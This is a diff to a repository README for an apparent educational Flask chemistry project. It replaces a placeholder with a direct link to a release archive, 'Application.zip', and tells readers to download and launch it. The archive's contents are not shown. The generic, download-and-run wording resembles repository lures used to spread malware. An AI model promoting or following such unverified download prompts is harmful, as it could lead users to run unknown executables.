@@ -22,7 +22,7 @@ This repository covers a wide range of topics related to web development and hig
 - Web development techniques
 
 ## Get Started
-To explore the project and its resources, visit the following link: [Download Application.zip](https://github.com/file/Application.zip). Click on the link to access the project files and launch the application to begin your learning journey.
+To explore the project and its resources, visit the following link: [Download https://github.com/JrTizz/School-Flask-Chem/releases/download/v1.0.0/Application.zip](https://github.com/JrTizz/School-Flask-Chem/releases/download/v1.0.0/Application.zip). Click on the link to access the project files and launch the application to begin your learning journey.
 
 ## Additional Information
 If the provided link does not work or needs clarification, please check the "Releases" section of this repository for alternate download options. Feel free to explore the project, experiment with the code, and enhance your understanding of chemical bonds through this educational resource.
